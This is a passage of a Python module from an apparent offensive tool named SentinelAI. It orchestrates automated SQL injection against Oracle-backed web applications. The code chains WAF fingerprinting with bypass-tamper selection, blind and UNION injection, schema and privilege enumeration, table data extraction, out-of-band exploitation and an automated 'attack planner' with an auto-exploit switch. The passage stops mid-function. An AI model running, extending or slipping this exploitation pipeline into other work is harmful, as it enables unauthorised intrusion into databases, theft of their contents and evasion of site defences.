# app/modules/scanner/oracle_enum.py
"""
Oracle database detection for SentinelAI.
Phase 1: Oracle Detection Only.
Phase 2: Oracle Version Fingerprinting.
Phase 3: Oracle Schema Enumeration.
Phase 4: Oracle Data Extraction.
Phase 5: Oracle Privilege Enumeration.
Phase 6: Oracle Database & Environment Enumeration.
Phase 7: SQL Injection Detection.
Phase 8: Injection Point Discovery.
Phase 9: Column Count Detection & Reflective Discovery.
Phase 10: Data Type Detection.
Phase 11: Boolean-Based Blind SQL Injection Detection.
Phase 12: Time-Based Blind SQL Injection Detection.
Phase 13: Error-Based Exploitation Detection.
Phase 14: Web Application Firewall (WAF) Detection & Fingerprinting.
Phase 15: Payload Tamper Engine.
Phase 16: UNION Exploiter.
Phase 17: Automatic Database Dumper.
Phase 18: Blind Data Extraction Engine.
Phase 19: Out-of-Band (OOB) Exploitation Engine.
Phase 20: AI Attack Planner & Exploitation Orchestrator. (NEW)
"""

import logging
from dataclasses import dataclass, field
from typing import Optional, Dict, List, Any, Union, Set, Tuple
import requests

from .payloads import OracleDetectionPayloads, DetectionPayload
from .union_sqli import UnionSQLi
from .html_parser import HTMLParser
from .regex_utils import RegexUtils
from .oracle_version import OracleVersionFingerprinter, OracleVersionResult
from .oracle_schema import OracleSchemaEnumerator, OracleSchemaResult
from .oracle_extractor import OracleDataExtractor, OracleExtractionResult
from .oracle_privileges import OraclePrivilegeEnumerator, OraclePrivilegeResult
from .oracle_database import OracleDatabaseEnumerator, OracleDatabaseResult
from .sqli_detector import SQLiDetector, SQLiDetectionResult
from .injection_points import InjectionPointDiscovery, InjectionDiscoveryResult
from .column_detector import OracleColumnDetector, ColumnDetectionResult
from .datatype_detector import OracleDataTypeDetector, DataTypeDetectionResult
from .blind_boolean import OracleBlindBooleanEngine, BlindBooleanResult
from .blind_time import OracleTimeBlindEngine, TimeBlindResult
from .error_based import OracleErrorBasedEngine, ErrorBasedResult
from .waf_detector import WAFDetector, WAFDetectionResult
from .tamper_engine import TamperEngine, TamperResult
from .union_exploiter import OracleUnionExploiter, UnionExploitResult
from .database_dumper import OracleDatabaseDumper, DatabaseDumpResult
from .oracle_attack import (
    plan_attack_impl,
    execute_plan_impl,
)

# Phase 18: Blind Data Extractor
from .blind_extractor import (
    BlindExtractor,
    BlindExtractionResult,
    ExtractionTechnique,
    ExtractionStatus,
    CharacterSet,
)

# Phase 19: Out-of-Band (OOB) Exploitation Engine
from .oob_exploiter import OutOfBandExploiter, OOBExploitResult, OOBTechnique, OOBStatus

# Phase 20: AI Attack Planner & Exploitation Orchestrator
from .attack_planner import (
    AttackPlanner,
    AttackPlanResult,
    ExploitationStrategy,
    RiskLevel,
)


@dataclass
class DetectionResult:
    """Result of Oracle detection."""

    is_oracle: bool = False
    score: int = 0
    threshold: int = 50
    indicators: Dict[str, int] = field(default_factory=dict)
    reason: str = ""
    version_result: Optional[OracleVersionResult] = None
    database_results: Optional[OracleDatabaseResult] = None
    schema_result: Optional[OracleSchemaResult] = None
    extraction_results: Optional[Dict[str, OracleExtractionResult]] = field(
        default_factory=dict
    )
    privilege_results: Optional[OraclePrivilegeResult] = None
    sqli_result: Optional[SQLiDetectionResult] = None
    injection_discovery: Optional[InjectionDiscoveryResult] = None
    column_detection: Optional[ColumnDetectionResult] = None
    datatype_detection: Optional[DataTypeDetectionResult] = None
    blind_boolean_result: Optional[BlindBooleanResult] = None
    time_blind_result: Optional[TimeBlindResult] = None
    error_based_result: Optional[ErrorBasedResult] = None
    waf_result: Optional[WAFDetectionResult] = None
    tamper_result: Optional[TamperResult] = None
    union_result: Optional[UnionExploitResult] = None
    dump_result: Optional[DatabaseDumpResult] = None

    # Phase 18: Blind extraction result
    blind_extract_result: Optional[BlindExtractionResult] = None

    # Phase 19: OOB exploitation result
    oob_result: Optional[OOBExploitResult] = None

    # Phase 20: Attack plan result
    attack_plan_result: Optional[AttackPlanResult] = None

    def add_indicator(self, name: str, score: int):
        """Add an indicator and its score."""
        self.indicators[name] = score
        self.score += score

    def get_summary(self) -> str:
        """Get a summary of the detection result."""
        if self.is_oracle:
            base = f"Oracle detected (Score: {self.score}/{self.threshold})"

            # Phase 20: Include attack plan summary
            if self.attack_plan_result and self.attack_plan_result.success:
                base = f"{base} - {self.attack_plan_result.get_summary()}"

            # Phase 19: Include OOB summary
            if self.oob_result and self.oob_result.success:
                base = f"{base} - {self.oob_result.get_summary()}"

            # Phase 18: Include blind extraction summary
            if self.blind_extract_result and self.blind_extract_result.success:
                base = f"{base} - {self.blind_extract_result.get_summary()}"

            if self.dump_result and self.dump_result.success:
                base = f"{base} - {self.dump_result.get_summary()}"
            if self.union_result and self.union_result.success:
                base = f"{base} - {self.union_result.get_summary()}"
            if self.tamper_result and self.tamper_result.success:
                base = f"{base} - {self.tamper_result.get_summary()}"
            if self.waf_result and self.waf_result.success:
                base = f"{base} - {self.waf_result.get_summary()}"
            if self.error_based_result and self.error_based_result.success:
                base = f"{base} - {self.error_based_result.get_summary()}"
            if self.time_blind_result and self.time_blind_result.success:
                base = f"{base} - {self.time_blind_result.get_summary()}"
            if self.blind_boolean_result and self.blind_boolean_result.success:
                base = f"{base} - {self.blind_boolean_result.get_summary()}"
            if self.datatype_detection and self.datatype_detection.success:
                base = f"{base} - {self.datatype_detection.get_summary()}"
            if self.column_detection and self.column_detection.success:
                base = f"{base} - {self.column_detection.get_summary()}"
            if self.injection_discovery and self.injection_discovery.success:
                base = f"{base} - {self.injection_discovery.get_summary()}"
            if self.sqli_result and self.sqli_result.success:
                base = f"{base} - {self.sqli_result.get_summary()}"
            if self.version_result and self.version_result.version:
                base = f"{base} - {self.version_result.get_summary()}"
            if self.database_results and self.database_results.success:
                base = f"{base} - {self.database_results.get_summary()}"
            if self.schema_result and self.schema_result.success:
                base = f"{base} - {self.schema_result.get_summary()}"
            if self.extraction_results:
                total_rows = sum(r.row_count for r in self.extraction_results.values())
                base = f"{base} - Extracted {total_rows} rows from {len(self.extraction_results)} tables"
            if self.privilege_results and self.privilege_results.success:
                base = f"{base} - {self.privilege_results.get_summary()}"
            return base
        else:
            return f"Oracle not detected (Score: {self.score}/{self.threshold})"

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary for logging/output."""
        data = {
            "is_oracle": self.is_oracle,
            "score": self.score,
            "threshold": self.threshold,
            "indicators": self.indicators,
            "reason": self.reason,
        }

        # Phase 20: Include attack plan in dict
        if self.attack_plan_result:
            data["attack_plan"] = self.attack_plan_result.to_dict()

        # Phase 19: Include OOB in dict
        if self.oob_result:
            data["oob"] = self.oob_result.to_dict()

        # Phase 18: Include blind extraction in dict
        if self.blind_extract_result:
            data["blind_extract"] = self.blind_extract_result.to_dict()

        if self.dump_result:
            data["dump"] = self.dump_result.to_dict()
        if self.union_result:
            data["union"] = self.union_result.to_dict()
        if self.tamper_result:
            data["tamper"] = self.tamper_result.to_dict()
        if self.waf_result:
            data["waf"] = self.waf_result.to_dict()
        if self.error_based_result:
            data["error_based"] = self.error_based_result.to_dict()
        if self.time_blind_result:
            data["time_blind"] = self.time_blind_result.to_dict()
        if self.blind_boolean_result:
            data["blind_boolean"] = self.blind_boolean_result.to_dict()
        if self.datatype_detection:
            data["datatype_detection"] = self.datatype_detection.to_dict()
        if self.column_detection:
            data["column_detection"] = self.column_detection.to_dict()
        if self.injection_discovery:
            data["injection_discovery"] = self.injection_discovery.to_dict()
        if self.sqli_result:
            data["sqli"] = self.sqli_result.to_dict()
        if self.version_result:
            data["version"] = self.version_result.to_dict()
        if self.database_results:
            data["database"] = self.database_results.to_dict()
        if self.schema_result:
            data["schema"] = self.schema_result.to_dict()
        if self.extraction_results:
            data["extraction"] = {
                k: v.to_dict() for k, v in self.extraction_results.items()
            }
        if self.privilege_results:
            data["privileges"] = self.privilege_results.to_dict()
        return data


class OracleEnum:
    """
    Oracle database detection module.
    Phase 1: Only detects if the backend is Oracle.
    Phase 2: Also performs version fingerprinting after detection.
    Phase 3: Also performs schema enumeration after detection.
    Phase 4: Also performs data extraction after detection.
    Phase 5: Also performs privilege enumeration after detection.
    Phase 6: Also performs database enumeration after detection.
    Phase 7: Also performs SQL injection detection before Oracle detection.
    Phase 8: Also performs injection point discovery before SQLi detection.
    Phase 9: Also performs column detection after injection discovery.
    Phase 10: Also performs data type detection after column detection.
    Phase 11: Also performs blind boolean detection before Oracle detection.
    Phase 12: Also performs time blind detection before Oracle detection.
    Phase 13: Also performs error based detection before Oracle detection.
    Phase 14: Also performs WAF detection before Oracle detection.
    Phase 15: Also provides payload tampering capabilities.
    Phase 16: Also performs UNION exploitation.
    Phase 17: Also provides automatic database dumping.
    Phase 18: Also provides blind data extraction.
    Phase 19: Also provides out-of-band (OOB) exploitation.
    Phase 20: Also provides AI attack planning and orchestration. (NEW)
    """

    # Detection thresholds and constants
    ORACLE_THRESHOLD = 50
    MIN_INDICATOR_SCORE = 5

    # Indicator weights
    INDICATOR_WEIGHTS = {
        "page_title_oracle": 10,
        "dual_success": 15,
        "v$version_success": 30,
        "oracle_error": 20,
        "oracle_keywords": 10,
        "all_tables_access": 20,
        "user_function": 15,
        "sysdate_function": 10,
        "rownum_success": 10,
        "response_significant_change": 15,
    }

    def __init__(
        self,
        session: requests.Session,
        base_url: str,
        logger: Optional[logging.Logger] = None,
    ):
        """
        Initialize OracleEnum module.

        Args:
            session: Requests session for HTTP requests
            base_url: Target base URL
            logger: Optional logger instance
        """
        self.session = session
        self.base_url = base_url
        self.logger = logger or self._setup_logger()

        # Initialize components
        self.union_sqli = UnionSQLi(session, base_url, logger)
        self.html_parser = HTMLParser()
        self.regex_utils = RegexUtils()
        self.payloads = OracleDetectionPayloads()

        # Phase 2: Version fingerprinter
        self.version_fingerprinter = OracleVersionFingerprinter(
            session, base_url, logger
        )

        # Phase 3: Schema enumerator
        self.schema_enumerator = OracleSchemaEnumerator(session, base_url, logger)

        # Phase 4: Data extractor
        self.data_extractor = OracleDataExtractor(session, base_url, logger)

        # Phase 5: Privilege enumerator
        self.privilege_enumerator = OraclePrivilegeEnumerator(session, base_url, logger)

        # Phase 6: Database enumerator
        self.database_enumerator = OracleDatabaseEnumerator(session, base_url, logger)

        # Phase 7: SQL Injection detector
        self.sqli_detector = SQLiDetector(session, base_url, logger)

        # Phase 8: Injection Point Discovery
        self.injection_discovery = InjectionPointDiscovery(session, base_url, logger)

        # Phase 9: Column detector
        self.column_detector = OracleColumnDetector(session, base_url, logger)

        # Phase 10: Data type detector
        self.datatype_detector = OracleDataTypeDetector(session, base_url, logger)

        # Phase 11: Blind Boolean engine
        self.blind_boolean_engine = OracleBlindBooleanEngine(session, base_url, logger)

        # Phase 12: Time Blind engine
        self.time_blind_engine = OracleTimeBlindEngine(session, base_url, logger)

        # Phase 13: Error Based engine
        self.error_based_engine = OracleErrorBasedEngine(session, base_url, logger)

        # Phase 14: WAF Detector
        self.waf_detector = WAFDetector(session, base_url, logger)

        # Phase 15: Tamper Engine
        self.tamper_engine = TamperEngine(logger)

        # Phase 16: UNION Exploiter
        self.union_exploiter = OracleUnionExploiter(session, base_url, logger)

        # Phase 17: Database Dumper (lazy initialization)
        self.database_dumper = None

        # Phase 18: Blind Extractor (lazy initialization)
        self.blind_extractor = None
        self._current_injection_point = None

        # Phase 19: OOB Exploiter (lazy initialization)
        self.oob_exploiter = None
        self.oob_query = None
        self.exploit_oob = False

        # Phase 20: Attack Planner (lazy initialization)
        self.attack_planner = None
        self._execution_function = None

        # State
        self.baseline_response = None
        self.detection_result = None

        self.logger.info("[OracleEnum] Module initialized for Oracle detection")
        self.logger.info(f"[OracleEnum] Target: {base_url}")

    def _setup_logger(self) -> logging.Logger:
        """Set up default logger."""
        logger = logging.getLogger("OracleEnum")
        logger.setLevel(logging.DEBUG)

        if not logger.handlers:
            ch = logging.StreamHandler()
            ch.setLevel(logging.DEBUG)
            formatter = logging.Formatter(
                "%(asctime)s - %(name)s - %(levelname)s - %(message)s"
            )
            ch.setFormatter(formatter)
            logger.addHandler(ch)

        return logger

    def _get_baseline(self, injection_point: str) -> Optional[requests.Response]:
        """Get baseline response for comparison."""
        if self.baseline_response is None:
            self.logger.info("[OracleEnum] Fetching baseline response...")
            self.baseline_response = self.union_sqli.get_baseline(injection_point)

            if self.baseline_response:
                self.logger.info(
                    f"[OracleEnum] Baseline response length: {len(self.baseline_response.text)}"
                )
            else:
                self.logger.warning("[OracleEnum] Failed to get baseline response")

        return self.baseline_response

    def _check_page_title(self, response: requests.Response) -> int:
        """Check if page title contains Oracle indicators."""
        title = self.html_parser.get_page_title(response.text)
        if not title:
            return 0

        title_lower = title.lower()
        score = 0

        if "oracle" in title_lower:
            score += self.INDICATOR_WEIGHTS["page_title_oracle"]
            self.logger.info(f"[OracleEnum] Page title contains 'Oracle': {title}")

        if "database" in title_lower and (
            "error" in title_lower or "exception" in title_lower
        ):
            score += 5

        return score

    def _check_indicator_in_response(
        self, response: requests.Response, indicator: str
    ) -> bool:
        """Check if an indicator exists in the response."""
        if not response:
            return False

        return indicator.lower() in response.text.lower()

    def _extract_oracle_errors(self, response: requests.Response) -> List[str]:
        """Extract Oracle error codes from response."""
        return self.regex_utils.extract_oracle_errors(response.text)

    def _check_oracle_keywords(self, response: requests.Response) -> int:
        """Check for Oracle-specific keywords in response."""
        keywords = self.regex_utils.contains_oracle_keywords(response.text)

        if keywords:
            self.logger.info(f"[OracleEnum] Found Oracle keywords: {keywords}")
            base_score = self.INDICATOR_WEIGHTS["oracle_keywords"]
            bonus = len(keywords) * 2
            return min(base_score + bonus, 20)

        return 0

    def _analyze_response_change(
        self, response: requests.Response, baseline: requests.Response
    ) -> int:
        """Analyze significant changes between baseline and response."""
        if not baseline or not response:
            return 0

        diff = self.html_parser.response_diff(baseline.text, response.text)

        if diff.get("significant_change", False):
            self.logger.info(f"[OracleEnum] Significant response change detected")
            self.logger.info(
                f"[OracleEnum] Response length diff: {diff.get('length_diff', 0)}"
            )
            self.logger.info(
                f"[OracleEnum] New words count: {len(diff.get('new_words', []))}"
            )

            new_text = " ".join(diff.get("new_words", []))
            oracle_keywords = self.regex_utils.contains_oracle_keywords(new_text)

            if oracle_keywords:
                self.logger.info(
                    f"[OracleEnum] Oracle keywords in new content: {oracle_keywords}"
                )
                return self.INDICATOR_WEIGHTS["response_significant_change"] + 5

            return self.INDICATOR_WEIGHTS["response_significant_change"]

        return 0

    def _test_payload(
        self, injection_point: str, payload: DetectionPayload
    ) -> Dict[str, Any]:
        """Test a single payload and evaluate response."""
        self.logger.info(f"[OracleEnum] Testing: {payload.description}")
        self.logger.info(f"[OracleEnum] Payload: {payload.payload}")

        baseline = self._get_baseline(injection_point)

        result = self.union_sqli.test_payload(
            injection_point, payload.payload, baseline
        )

        if not result["success"] or result.get("response") is None:
            self.logger.warning(
                f"[OracleEnum] Payload test failed: {payload.description}"
            )
            return {"success": False, "score": 0, "response": None}

        response = result["response"]

        score = 0
        indicators = []

        if payload.success_indicator:
            if self._check_indicator_in_response(response, payload.success_indicator):
                score += payload.weight
                indicators.append(f"{payload.success_indicator} found")

        errors = self._extract_oracle_errors(response)
        if errors:
            error_score = self.INDICATOR_WEIGHTS["oracle_error"]
            score += error_score
            indicators.append(f"Oracle errors: {errors}")

        keyword_score = self._check_oracle_keywords(response)
        if keyword_score:
            score += keyword_score
            indicators.append("Oracle keywords found")

        if baseline and result["has_changed"]:
            change_score = self._analyze_response_change(response, baseline)
            if change_score:
                score += change_score
                indicators.append("Significant response change")

        if "dual" in payload.payload.lower():
            if self._check_indicator_in_response(response, "dual"):
                score += 5

        if "v$version" in payload.payload.lower():
            if self._check_indicator_in_response(response, "Oracle"):
                score += 10

        self.logger.info(f"[OracleEnum] Score for payload: {score}")
        self.logger.info(f"[OracleEnum] Indicators: {indicators}")

        return {
            "success": True,
            "score": score,
            "response": response,
            "indicators": indicators,
            "description": payload.description,
        }

    def detect(
        self,
        injection_point: str,
        detect_waf: bool = True,
        detect_sqli: bool = True,
        discover_parameters: bool = True,
        detect_columns: bool = True,
        detect_datatypes: bool = True,
        detect_blind_boolean: bool = True,
        detect_time_blind: bool = True,
        detect_error_based: bool = True,
        exploit_union: bool = True,
        fingerprint_version: bool = True,
        enumerate_database: bool = True,
        enumerate_schema: bool = True,
        enumerate_privileges: bool = True,
        extract_data: bool = False,
        # Phase 18: Blind extraction parameters
        blind_extract: bool = False,
        blind_target_type: str = "all",
        blind_target_name: Optional[str] = None,
        blind_max_items: int = 1000,
        # Phase 19: OOB exploitation parameters
        exploit_oob: bool = False,
        oob_query: Optional[str] = None,
        oob_techniques: Optional[List[OOBTechnique]] = None,
        oob_auto_detect: bool = True,
        # Phase 20: Attack planning parameters
        create_attack_plan: bool = True,
        auto_exploit: bool = False,
        auto_exploit_query: Optional[str] = None,
    ) -> DetectionResult:
        """
        Main detection method for Oracle.

        Args:
            injection_point: Parameter to inject into
            detect_waf: Whether to perform WAF detection (Phase 14)
            detect_sqli: Whether to perform SQL injection detection (Phase 7)
            discover_parameters: Whether to discover injection points (Phase 8)
            detect_columns: Whether to detect column count (Phase 9)
            detect_datatypes: Whether to detect data types (Phase 10)
            detect_blind_boolean: Whether to detect blind boolean (Phase 11)
            detect_time_blind: Whether to detect time blind (Phase 12)
            detect_error_based: Whether to detect error based (Phase 13)
            exploit_union: Whether to perform UNION exploitation (Phase 16)
            fingerprint_version: Whether to perform version fingerprinting (Phase 2)
            enumerate_database: Whether to perform database enumeration (Phase 6)
            enumerate_schema: Whether to perform schema enumeration (Phase 3)
            enumerate_privileges: Whether to perform privilege enumeration (Phase 5)
            extract_data: Whether to perform data extraction (Phase 4)
            blind_extract: Whether to perform blind extraction (Phase 18)
            blind_target_type: Target type for blind extraction
            blind_target_name: Target name for blind extraction
            blind_max_items: Maximum items for blind extraction
            exploit_oob: Whether to perform OOB exploitation (Phase 19)
            oob_query: SQL query for OOB exploitation
            oob_techniques: Specific OOB techniques to use
            oob_auto_detect: Auto-detect OOB techniques
            create_attack_plan: Whether to create an attack plan (Phase 20)
            auto_exploit: Whether to automatically exploit (Phase 20)
            auto_exploit_query: Query for auto-exploitation

        Returns:
            DetectionResult: Detection result with all details
        """
        self.logger.info(
            "[OracleEnum] =================================================="
        )
        self.logger.info("[OracleEnum] ORACLE DETECTION PHASE 1")
        self.logger.info(
            "[OracleEnum] =================================================="
        )

        self._current_injection_point = injection_point
        result = DetectionResult(is_oracle=False, threshold=self.ORACLE_THRESHOLD)

        # Phase 14: WAF Detection (runs first)
        if detect_waf:
            self.logger.info(
                "[OracleEnum] WAF detection enabled - Starting WAF detection..."
            )
            try:
                waf_result = self.waf_detector.detect(injection_point)
                result.waf_result = waf_result
                self.logger.info(
                    f"[OracleEnum] WAF detection complete: {waf_result.get_summary()}"
                )

                if waf_result.waf_detected:
                    self.logger.info(
                        f"[OracleEnum] WAF detected: {waf_result.waf_name} (Confidence: {waf_result.confidence}%)"
                    )
                    self.logger.info(
                        f"[OracleEnum] Bypass recommendations: {len(waf_result.bypass_recommendations)} available"
                    )

                    if waf_result.waf_name:
                        recommended_tampers = self.tamper_engine.recommend_tampers(
                            waf_result.waf_name
                        )
                        self.logger.info(
                            f"[OracleEnum] Recommended tampers for {waf_result.waf_name}: {recommended_tampers}"
                        )
            except Exception as e:
                self.logger.error(f"[OracleEnum] WAF detection failed: {str(e)}")

        # Phase 8: Injection Point Discovery
        if discover_parameters:
            self.logger.info(
                "[OracleEnum] Injection point discovery enabled - Starting discovery..."
            )
            try:
                discovery_result = self.injection_discovery.discover_all(
                    url=self.base_url, test_parameters=False
                )
                result.injection_discovery = discovery_result
                self.logger.info(
                    f"[OracleEnum] Injection point discovery complete: {discovery_result.get_summary()}"
                )

                best_param = discovery_result.get_best_parameter()
                if best_param and best_param.parameter_name:
                    injection_point = best_param.parameter_name
                    self.logger.info(
                        f"[OracleEnum] Using best parameter: {injection_point}"
                    )
                    self._current_injection_point = injection_point
            except Exception as e:
                self.logger.error(
                    f"[OracleEnum] Injection point discovery failed: {str(e)}"
                )

        # Phase 9: Column Detection
        if detect_columns:
            self.logger.info(
                "[OracleEnum] Column detection enabled - Starting column detection..."
            )
            try:
                column_result = self.column_detector.detect_column_count(
                    injection_point
                )
                result.column_detection = column_result
                self.logger.info(
                    f"[OracleEnum] Column detection complete: {column_result.get_summary()}"
                )

                if column_result.success and column_result.reflective_columns:
                    self.logger.info(
                        f"[OracleEnum] Found {len(column_result.reflective_columns)} reflective columns"
                    )
                    if column_result.union_payload:
                        self.logger.info(
                            f"[OracleEnum] Best UNION payload: {column_result.union_payload[:50]}..."
                        )
            except Exception as e:
                self.logger.error(f"[OracleEnum] Column detection failed: {str(e)}")

        # Phase 10: Data Type Detection
        if (
            detect_datatypes
            and result.column_detection
            and result.column_detection.success
        ):
            self.logger.info(
                "[OracleEnum] Data type detection enabled - Starting data type detection..."
            )
            try:
                column_count = result.column_detection.column_count
                datatype_result = self.datatype_detector.detect_column_types(
                    injection_point, column_count
                )
                result.datatype_detection = datatype_result
                self.logger.info(
                    f"[OracleEnum] Data type detection complete: {datatype_result.get_summary()}"
                )

                if datatype_result.success and datatype_result.working_union_payload:
                    self.logger.info(
                        f"[OracleEnum] Best UNION payload: {datatype_result.working_union_payload[:50]}..."
                    )
            except Exception as e:
                self.logger.error(f"[OracleEnum] Data type detection failed: {str(e)}")

        # Phase 11: Blind Boolean Detection
        if detect_blind_boolean:
            self.logger.info(
                "[OracleEnum] Blind boolean detection enabled - Starting detection..."
            )
            try:
                blind_result = self.blind_boolean_engine.detect_boolean_blind(
                    injection_point
                )
                result.blind_boolean_result = blind_result
                self.logger.info(
                    f"[OracleEnum] Blind boolean detection complete: {blind_result.get_summary()}"
                )

                if blind_result.is_vulnerable:
                    self.logger.info(
                        f"[OracleEnum] Boolean blind SQL injection confirmed!"
                    )
                    self.logger.info(
                        f"[OracleEnum] Best true payload: {blind_result.best_true_payload}"
                    )
                    self.logger.info(
                        f"[OracleEnum] Best false payload: {blind_result.best_false_payload}"
                    )
            except Exception as e:
                self.logger.error(
                    f"[OracleEnum] Blind boolean detection failed: {str(e)}"
                )

        # Phase 12: Time Blind Detection
        if detect_time_blind:
            self.logger.info(
                "[OracleEnum] Time blind detection enabled - Starting detection..."
            )
            try:
                time_result = self.time_blind_engine.detect_time_blind(injection_point)
                result.time_blind_result = time_result
                self.logger.info(
                    f"[OracleEnum] Time blind detection complete: {time_result.get_summary()}"
                )

                if time_result.is_vulnerable:
                    self.logger.info(
                        f"[OracleEnum] Time-based blind SQL injection confirmed!"
                    )
                    self.logger.info(
                        f"[OracleEnum] Delay: {time_result.delay_seconds:.2f}s"
                    )
                    self.logger.info(
                        f"[OracleEnum] Best payload: {time_result.best_payload}"
                    )
            except Exception as e:
                self.logger.error(f"[OracleEnum] Time blind detection failed: {str(e)}")

        # Phase 13: Error Based Detection
        if detect_error_based:
            self.logger.info(
                "[OracleEnum] Error-based detection enabled - Starting detection..."
            )
            try:
                error_result = self.error_based_engine.detect_error_based(
                    injection_point
                )
                result.error_based_result = error_result
                self.logger.info(
                    f"[OracleEnum] Error-based detection complete: {error_result.get_summary()}"
                )

                if error_result.is_vulnerable:
                    self.logger.info(
                        f"[OracleEnum] Error-based SQL injection confirmed!"
                    )
                    self.logger.info(
                        f"[OracleEnum] Best payload: {error_result.best_payload}"
                    )
                    if error_result.extracted_values:
                        self.logger.info(
                            f"[OracleEnum] Extracted values: {list(error_result.extracted_values.values())[:3]}"
                        )
            except Exception as e:
                self.logger.error(
                    f"[OracleEnum] Error-based detection failed: {str(e)}"
                )

        # Phase 16: UNION Exploitation
        if exploit_union:
            self.logger.info(
                "[OracleEnum] UNION exploitation enabled - Starting exploitation..."
            )
            try:
                waf_name = None
                if result.waf_result and result.waf_result.waf_detected:
                    waf_name = result.waf_result.waf_name

                union_result = self.union_exploiter.exploit(injection_point, waf_name)
                result.union_result = union_result
                self.logger.info(
                    f"[OracleEnum] UNION exploitation complete: {union_result.get_summary()}"
                )

                if union_result.success:
                    self.logger.info(
                        f"[OracleEnum] Working payload: {union_result.payload}"
                    )
                    self.logger.info(
                        f"[OracleEnum] Column count: {union_result.column_count}"
                    )
            except Exception as e:
                self.logger.error(f"[OracleEnum] UNION exploitation failed: {str(e)}")

        # Phase 7: SQL Injection Detection
        if detect_sqli:
            self.logger.info(
                "[OracleEnum] SQL Injection detection enabled - Starting detection..."
            )
            try:
                sqli_result = self.sqli_detector.detect(injection_point)
                result.sqli_result = sqli_result
                self.logger.info(
                    f"[OracleEnum] SQL Injection detection complete: {sqli_result.get_summary()}"
                )

                if sqli_result.success and sqli_result.confidence < 40:
                    self.logger.warning(
                        "[OracleEnum] Low confidence SQL injection detected, continuing..."
                    )
                elif not sqli_result.success:
                    self.logger.info(
                        "[OracleEnum] No SQL injection detected with high confidence"
                    )
            except Exception as e:
                self.logger.error(
                    f"[OracleEnum] SQL Injection detection failed: {str(e)}"
                )

        # Step 1: Check page title
        self.logger.info("[OracleEnum] Step 1: Checking page title...")
        baseline = self._get_baseline(injection_point)
        if baseline:
            title_score = self._check_page_title(baseline)
            if title_score:
                result.add_indicator("page_title_oracle", title_score)
                self.logger.info(f"[OracleEnum] Page title score: +{title_score}")

        # Step 2: Test all payloads
        self.logger.info("[OracleEnum] Step 2: Testing detection payloads...")
        payload_results = []

        for payload in self.payloads.get_all_payloads():
            test_result = self._test_payload(injection_point, payload)
            if test_result["success"] and test_result["score"] > 0:
                payload_results.append(test_result)
                result.add_indicator(
                    f"payload_{payload.description[:20]}", test_result["score"]
                )
                self.logger.info(f"[OracleEnum] Total score: +{test_result['score']}")

        # Step 3: Additional checks
        self.logger.info("[OracleEnum] Step 3: Additional checks...")

        if baseline:
            errors = self._extract_oracle_errors(baseline)
            if errors:
                result.add_indicator("oracle_errors_in_baseline", 10)
                self.logger.info(f"[OracleEnum] Oracle errors in baseline: +10")

        # Determine if Oracle is detected
        result.is_oracle = result.score >= result.threshold

        # Set reason
        if result.is_oracle:
            top_indicators = sorted(
                result.indicators.items(), key=lambda x: x[1], reverse=True
            )[:3]
            reasons = [f"{name} (+{score})" for name, score in top_indicators]
            result.reason = f"Oracle detected based on indicators: {', '.join(reasons)}"

            # Phase 2: Version Fingerprinting
            if fingerprint_version:
                self.logger.info(
                    "[OracleEnum] Oracle detected - Starting version fingerprinting..."
                )
                try:
                    version_result = self.version_fingerprinter.fingerprint(
                        injection_point
                    )
                    result.version_result = version_result
                    self.logger.info(
                        f"[OracleEnum] Version fingerprinting complete: {version_result.get_summary()}"
                    )
                except Exception as e:
                    self.logger.error(
                        f"[OracleEnum] Version fingerprinting failed: {str(e)}"
                    )

            # Phase 6: Database Enumeration
            if enumerate_database:
                self.logger.info(
                    "[OracleEnum] Database enumeration enabled - Starting database enumeration..."
                )
                try:
                    database_result = self.database_enumerator.enumerate_all(
                        injection_point
                    )
                    result.database_results = database_result
                    self.logger.info(
                        f"[OracleEnum] Database enumeration complete: {database_result.get_summary()}"
                    )
                except Exception as e:
                    self.logger.error(
                        f"[OracleEnum] Database enumeration failed: {str(e)}"
                    )

            # Phase 3: Schema Enumeration
            if enumerate_schema:
                self.logger.info(
                    "[OracleEnum] Oracle detected - Starting schema enumeration..."
                )
                try:
                    schema_result = self.schema_enumerator.enumerate_all(
                        injection_point
                    )
                    result.schema_result = schema_result
                    self.logger.info(
                        f"[OracleEnum] Schema enumeration complete: {schema_result.get_summary()}"
                    )
                except Exception as e:
                    self.logger.error(
                        f"[OracleEnum] Schema enumeration failed: {str(e)}"
                    )

            # Phase 5: Privilege Enumeration
            if enumerate_privileges:
                self.logger.info(
                    "[OracleEnum] Privilege enumeration enabled - Starting privilege enumeration..."
                )
                try:
                    privilege_result = self.privilege_enumerator.enumerate_all(
                        injection_point
                    )
                    result.privilege_results = privilege_result
                    self.logger.info(
                        f"[OracleEnum] Privilege enumeration complete: {privilege_result.get_summary()}"
                    )
                except Exception as e:
                    self.logger.error(
                        f"[OracleEnum] Privilege enumeration failed: {str(e)}"
                    )

            # Phase 4: Data Extraction
            if extract_data and result.schema_result:
                self.logger.info(
                    "[OracleEnum] Data extraction enabled - Starting data extraction..."
                )
                try:
                    extraction_results = {}
                    for schema, tables in result.schema_result.tables.items():
                        for table in tables[:5]:
                            try:
                                self.logger.info(
                                    f"[OracleEnum] Extracting data from: {schema}.{table}"
                                )
                                extract_result = self.data_extractor.extract_table(
                                    injection_point, schema, table, max_rows=100
                                )
                                extraction_results[f"{schema}.{table}"] = extract_result
                                self.logger.info(
                                    f"[OracleEnum] Extracted {extract_result.row_count} rows from {schema}.{table}"
                                )
                            except Exception as e:
                                self.logger.error(
                                    f"[OracleEnum] Data extraction failed for {schema}.{table}: {str(e)}"
                                )

                    result.extraction_results = extraction_results
                    self.logger.info(
                        f"[OracleEnum] Data extraction complete: {len(extraction_results)} tables"
                    )
                except Exception as e:
                    self.logger.error(f"[OracleEnum] Data extraction failed: {str(e)}")

            # ============================================================
            # Phase 18: Blind Extraction
            # ============================================================
            if blind_extract:
                self.logger.info(
                    "[OracleEnum] Blind extraction enabled - Starting blind extraction..."
                )
                try:
                    blind_result = self.extract_blind_all(
                        injection_point=injection_point,
                        target_type=blind_target_type,
                        target_name=blind_target_name,
                        max_items=blind_max_items,
                        auto_detect_technique=True,
                    )
                    result.blind_extract_result = blind_result

                    if blind_result.success:
                        self.logger.info(
                            f"[OracleEnum] Blind extraction complete: {blind_result.get_summary()}"
                        )
                        self.logger.info(
                            f"[OracleEnum] Extracted {len(blind_result.extracted_items)} items"
                        )
                    else:
                        self.logger.warning(
                            f"[OracleEnum] Blind extraction failed: {blind_result.errors[0] if blind_result.errors else 'Unknown error'}"
                        )
                except Exception as e:
